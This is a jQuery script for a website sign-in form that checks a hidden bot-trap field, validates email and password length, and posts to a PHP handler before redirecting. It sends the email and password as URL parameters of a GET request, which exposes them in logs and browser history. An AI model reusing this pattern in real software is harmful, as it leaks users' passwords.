// Set the ajax URL here
var ajax_url = 'https://baseball-star.com/backend/handlers/signin.php';

// Listen for the enter key then "click" the form button
$('.form-group input').keyup(function(event) {
  if (event.keyCode === 13) {
    $('.btn-send').click();
  }
});

// Handle button click
$('.btn-send').on('click', function () {

  // Disable the button until finished with the following processes
  $('.btn-send').prop('disabled', true);

  // Get the value of the bot trap input
  var bot_trap = $('#form_trap').val() || '';

  // Only proceed if the bot trap value is 0.
  // Unsophisticated bots will fill out all inputs on a page.
  // The bot trap is hidden to humans
  if (bot_trap.length == 0) {

    // Only proceed  if the ajax URL string length is greater than 0
    if (ajax_url.length > 0) {

      // Form data sent to Ajax page
      let email     = $('#form_email').val() || '';
      let password  = $('#form_password').val() || '';

      // Prevent invalid email and password length from being submitted
      if (email.length > 0 && password.length > 0) {

        // Make sure passwords are long enough
        if (password.length >= 6) {

          // Trigger ajax
          $.ajax({

            // Ajax type
            type: "GET",

            // Ajax URL
            url: ajax_url,

            // URL parameters
            data: {
              email: email,
              password: password
            },

            // Prevent caching
            cache: false,

            // Force text format
            dataType: "text",

            // Ajax request was successful. Response is either a redirect URL or 'error'
            success: function(response) {

              // Display an error
              if (response === 'error') {

                // Error message
                $('.messages').html('<div class="alert alert-danger alert-dismissable"><button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button>We couldn\'t sign you in. Double check the password and email you entered or contact us.</div>');

                // Enable the button
                $('.btn-send').prop('disabled', false);

              }

              // Redirect to the next page in the process
              else {
                window.location.replace(response);
              }
            }
          });

          return false;

        }

        // A password must be greater than 5 characters
        else {

          // Error message
          $('.messages').html('<div class="alert alert-danger alert-dismissable"><button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button>Your password must be greater than 5 characters. Please try again.</div>');

          // Enable the button
          $('.btn-send').prop('disabled', false);

          return false;
        }

      }

      // email and password are not greater than 0
      else {

        // Error message
        $('.messages').html('<div class="alert alert-danger alert-dismissable"><button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button>Your account email and password must be more than 1 character. Please try again.</div>');

        // Enable the button
        $('.btn-send').prop('disabled', false);

        return false;
      }

    }

    // ajax_url is not greater than 0.
    else {

      // Error message
      $('.messages').html('<div class="alert alert-danger alert-dismissable"><button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button>There was an issue signing into your account. Please contact us or try again.</div>');

      // Enable the button
      $('.btn-send').prop('disabled', false);

      return false;
    }

  }

  // Bot trap input was filled out.
  else {

    // Error message
    $('.messages').html('<div class="alert alert-danger alert-dismissable"><button type="button" class="close" data-dismiss="alert" aria-hidden="true">&times;</button>An invalid action was performed during sign in. Please contact us or try again.</div>');

    // Enable the button
    $('.btn-send').prop('disabled', false);

    return false;
  }

});
